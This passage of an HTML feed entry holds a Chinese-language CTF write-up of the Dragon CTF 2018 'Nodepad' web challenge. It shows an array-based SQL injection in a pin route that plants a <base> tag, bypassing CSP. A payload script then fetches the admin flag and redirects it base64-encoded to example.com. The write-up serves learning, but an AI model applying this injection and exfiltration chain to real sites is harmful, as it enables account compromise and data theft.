-&lt;pre&gt;&lt;code&gt;Hi. I wish U luck. Only I can posses flag: DrgnS{L0l!_U_h4z_bR4ak_that_5upr_w33b4pp!Gratz!} ... he he he
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;notepad&#34;&gt;Notepad&lt;/h2&gt;
-
-&lt;p&gt;本题是基于 express 框架的 nodejs 程序，后端数据库是 PostgreSQL，不过这些都是次要的，本题考点是 xss。&lt;/p&gt;
-
-&lt;p&gt;题目提供了 4 个功能：&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;注册&lt;/li&gt;
-&lt;li&gt;登录&lt;/li&gt;
-&lt;li&gt;发布 note&lt;/li&gt;
-&lt;li&gt;查看 note&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;以及你可以 pin 一个 note，或是向管理员报告这个 note，这样管理员就会来查看你发布的 note。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/DragonCTF-Web-Writeup/view5.png&#34; alt=&#34;view 5&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;查看源码，我们可以看到我们之前的输入会以 json 的形式被页面存储，然后页面会调用 &lt;code&gt;notes.js&lt;/code&gt; 动态生成相应内容&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script nonce=&amp;quot;bd08c56c76fc48253d0e8dbd7018ec5b&amp;quot;&amp;gt;window.notes = [{&amp;quot;id&amp;quot;:5001,&amp;quot;title&amp;quot;:&amp;quot;test&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;test&amp;quot;,&amp;quot;pinned&amp;quot;:false}];&amp;lt;/script&amp;gt;
-&amp;lt;script nonce=&amp;quot;bd08c56c76fc48253d0e8dbd7018ec5b&amp;quot; src=&amp;quot;/javascripts/notes.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;&#39;use strict&#39;;
-
-$(document).ready(function() {
-  var container = $(&#39;#notes&#39;);
-  var template = $(&#39;#note&#39;).html();
-
-  function createNote(note) {
-    var element = $(template);
-    element.find(&#39;.title&#39;).attr(&#39;href&#39;, &#39;/notes/&#39; + note.id);
-    element.find(&#39;.title&#39;).html(note.title);
-
-    element.find(&#39;.pin&#39;).attr(&#39;action&#39;, &#39;/notes/&#39; + note.id + &#39;/pin&#39;);
-    if (note.pinned) {
-      element.find(&#39;.pin-text&#39;).text(&#39;Unpin&#39;);
-      element.find(&#39;.pin input[name=&amp;quot;value&amp;quot;]&#39;).attr(&#39;value&#39;, &#39;0&#39;);
-    } else {
-      element.find(&#39;.pin-text&#39;).text(&#39;Pin&#39;);
-      element.find(&#39;.pin input[name=&amp;quot;value&amp;quot;]&#39;).attr(&#39;value&#39;, &#39;1&#39;);
-    }
-
-    element.find(&#39;.report&#39;).attr(&#39;href&#39;, &#39;/notes/&#39; + note.id + &#39;/report&#39;);
-    element.find(&#39;.delete&#39;).attr(&#39;action&#39;, &#39;/notes/&#39; + note.id + &#39;/delete&#39;);
-
-    var body = element.find(&#39;.body&#39;);
-    note.content.split(&#39;\n&#39;).forEach(function(text, line) {
-      var el = $(&#39;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&#39;);
-      el.text(text);
-      if (line === 0) el.addClass(&#39;lead&#39;);
-      body.append(el);
-    });
-
-    container.append(element);
-  }
-
-  if (window.notes.length) {
-    window.notes.forEach(createNote);
-  } else {
-    container.append(&amp;quot;&amp;lt;p&amp;gt;You don&#39;t have any notes&amp;lt;/p&amp;gt;&amp;quot;);
-  }
-});
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这么现在利用的方式非常明显了，我们需要控制 &lt;code&gt;title&lt;/code&gt; 或者是 &lt;code&gt;content&lt;/code&gt; 在页面中注入相应代码。回到源码上，我们可以看到这一段的逻辑在 &lt;code&gt;/routes/notes.js&lt;/code&gt; 中：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;router.post(&#39;/new&#39;, async (req, res) =&amp;gt; {
-  const regex = /[&amp;lt;&amp;gt;]/;
-
-  let errors = [];
-  if (regex.test(req.body.title)) {
-    errors.push(&#39;Title is invalid&#39;);
-  }
-
-  if (regex.test(req.body.content)) {
-    errors.push(&#39;Content is invalid&#39;);
-  }
-
-  if (errors.length !== 0) {
-    return res.render(&#39;new&#39;, {errors});
-  }
-
-  const result = await req.db.get `INSERT INTO notes (title, content, user_id) VALUES (${req.body.title}, ${req.body.content}, ${req.session.userId}) RETURNING id`;
-  if (result) {
-    return res.redirect(`/notes/${result.id}`);
-  } else {
-    res.render(&#39;new&#39;, {errors: [`Error occurred while saving your note`]});
-  }
-});
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以看到由于正则的存在使得我们无法直接传入相应 payload，因为我们要闭合标签必然要引入尖括号。但这是不是无法解决的呢？在万能的 js 中，一切都是可能的！&lt;/p&gt;
-
-&lt;p&gt;我们注意到 &lt;code&gt;routes/notes.js&lt;/code&gt; 中定义的路由在执行 sql 语句时，存在着一个注入点，所以可以尝试在 &lt;code&gt;req.body.value&lt;/code&gt; 处进行 sql 注入：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;router.post(&#39;/:noteId(\\d+)/pin&#39;, async (req, res) =&amp;gt; {
-  if (req.body.value.length === 1) {
-    const result = await req.db.run(`UPDATE notes SET pinned = ${req.body.value}::boolean WHERE id = ${req.params.noteId}`);
-    if (result.error) {
-      return res.render(&#39;index&#39;, {errors: [&#39;An error occurred&#39;]});
-    }
-  }
-
-  res.redirect(&#39;/notes&#39;);
-});
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;但上述利用点对 &lt;code&gt;value&lt;/code&gt; 的长度有一定限制，不能超过 1，但在这里，我们可以通过将 &lt;code&gt;value&lt;/code&gt; 赋值成数组的方式绕过，因为数组恰好满足了长度为 1 的要求，而且在字符串模板拼接会被自动解包：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const value = [&amp;quot;1::boolean, title=&#39;&amp;lt;/script&amp;gt;&amp;lt;base href=http://example.com/&amp;gt;&#39; WHERE id = 8888--&amp;quot;]
-console.log(`UPDATE notes SET pinned = ${value}::boolean WHERE id = 8888`);
-// output
-// UPDATE notes SET pinned = 1::boolean, title=&#39;&amp;lt;/script&amp;gt;&amp;lt;base href=http://example.com/&amp;gt;&#39; WHERE id = 8888--::boolean WHERE id = 8888
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;既然这里已经确认存在一个 xss 的利用点了，然后下一步就是绕过 CSP 的限制。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;app.use((req, res, next) =&amp;gt; {
-  res.set(&#39;X-XSS-Protection&#39;, &#39;0&#39;);
-  res.set(&#39;Content-Security-Policy&#39;, `
-    default-src &#39;none&#39;;
-    script-src &#39;nonce-${res.locals.nonce}&#39; &#39;strict-dynamic&#39;;
-    style-src &#39;self&#39; https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css;
-    img-src &#39;self&#39;;
-    connect-src &#39;self&#39;;
-    frame-src https://www.google.com/recaptcha/;
-    form-action &#39;self&#39;;
-  `.replace(/\n/g, &#39;&#39;));
-  next();
-});
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以看到 CSP 对我们的脚本做了比较严格的限制，但我们仍然有办法：使用 &lt;code&gt;&amp;lt;base&amp;gt;&lt;/code&gt; 标签。根据 &lt;code&gt;&amp;lt;base&amp;gt;&lt;/code&gt; 的定义，它可以为页面上的所有链接规定一个默认地址或默认目标，然后浏览器随后将使用指定的基本 URL 来解析所有的相对 URL，包括 &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; \ &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; 等标签。这样我们就可以将 &lt;code&gt;javascripts/notes.js&lt;/code&gt; 指向部署在我们自己网站上的 payload，例如：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;// javascripts/notes.js in our websites
-fetch(&#39;http://nodepad.hackable.software:3000/admin/flag&#39;).then((res) =&amp;gt; {
-    res.text().then((text) =&amp;gt; {
-        location.href = &#39;http://example.com/?flag=&#39; + btoa(text);
-    });
-})
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;一波操作：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/DragonCTF-Web-Writeup/postman.png&#34; alt=&#34;Postman&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;成功获得 flag：&lt;code&gt;DrgnS{Ar3_Y0u_T3mP14t3d?}&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;PS: r3kapig 的大佬貌似使用了对象的方式绕过，具体原因大概是数据库操作时会进行的解包操作？感兴趣的朋友可以尝试一下（再告诉我，逃&lt;/p&gt;
-
-&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
-
-&lt;p&gt;Dargon Sector 不愧是国际强队，出的题目也相当的有质量，使人在做题之余也收获颇丰。&lt;/p&gt;
-
-&lt;h2 id=&#34;参考资料&#34;&gt;参考资料&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://ctftime.org/writeup/11452&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Nodepad by secse&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2831&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Teaser Dragon CTF 2018 Writeup by r3kapig&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.w3schools.com/tags/tag_base.asp&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;HTML &lt;base&gt; Tag&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings#Tagged_template_literals&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;模板字符串&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>
     </item>
